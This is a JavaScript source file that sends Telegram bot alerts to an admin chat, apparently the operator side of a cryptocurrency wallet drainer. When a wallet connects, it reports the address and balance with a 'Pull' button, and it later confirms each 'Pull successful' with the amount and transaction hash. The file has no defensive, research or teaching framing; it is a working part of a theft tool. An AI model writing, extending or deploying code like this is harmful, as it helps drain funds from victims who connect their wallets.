import axios from "axios";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_ID } from "./config.js";

const SEND_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const EDIT_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;

// Send simple message with inline keyboard (Pull button)
export async function sendNewWalletAlert(wallet, balanceDisplay) {
  const text = `🔔 New wallet connected\n${wallet}\nBalance: ${balanceDisplay}\nAction: Pull?`;
  const keyboard = {
    inline_keyboard: [
      [
        { text: "Pull", callback_data: `pull:${wallet}` },
        { text: "Ignore", callback_data: `ignore:${wallet}` }
      ]
    ]
  };
  await axios.post(SEND_URL, {
    chat_id: TELEGRAM_ADMIN_ID,
    text,
    reply_markup: keyboard
  });
}

export async function sendBalanceAlert(wallet, balanceDisplay) {
  const text = `⚠️ Balance alert\n${wallet}\nBalance: ${balanceDisplay}\nAction: Pull?`;
  const keyboard = {
    inline_keyboard: [[{ text: "Pull", callback_data: `pull:${wallet}` }]]
  };
  await axios.post(SEND_URL, {
    chat_id: TELEGRAM_ADMIN_ID,
    text,
    reply_markup: keyboard
  });
}

export async function sendPullSuccess(wallet, amount, txHash) {
  const text = `✅ Pull successful\nWallet: ${wallet}\nAmount: ${amount}\nTx: ${txHash}`;
  await axios.post(SEND_URL, {
    chat_id: TELEGRAM_ADMIN_ID,
    text
  });
}

export async function sendError(msg) {
  await axios.post(SEND_URL, {
    chat_id: TELEGRAM_ADMIN_ID,
    text: `❗️Error: ${msg}`
  });
}
